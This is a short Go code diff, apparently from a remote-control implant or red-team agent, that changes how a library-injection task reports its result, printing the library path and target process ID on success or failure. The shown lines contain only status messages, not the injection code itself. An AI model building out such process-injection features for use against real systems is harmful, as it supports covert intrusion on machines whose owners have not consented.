@@ -52,6 +52,11 @@ func Run(task structs.Task, threadChannel chan<- structs.ThreadMsg) {
 		return
 	}
 
-	tMsg.TaskResult = []byte(fmt.Sprintf("Code injection into pid: %d returned result: %s", args.PID, result.Success()))
+	if result.Success() {
+		tMsg.TaskResult = []byte(fmt.Sprintf("Successfully injected %s injection into pid: %d ", args.LibraryPath, args.PID))
+	} else {
+		tMsg.TaskResult = []byte(fmt.Sprintf("Failed to inject %s into pid: %d ", args.LibraryPath, args.PID))
+	}
+
 	threadChannel <- tMsg
 }
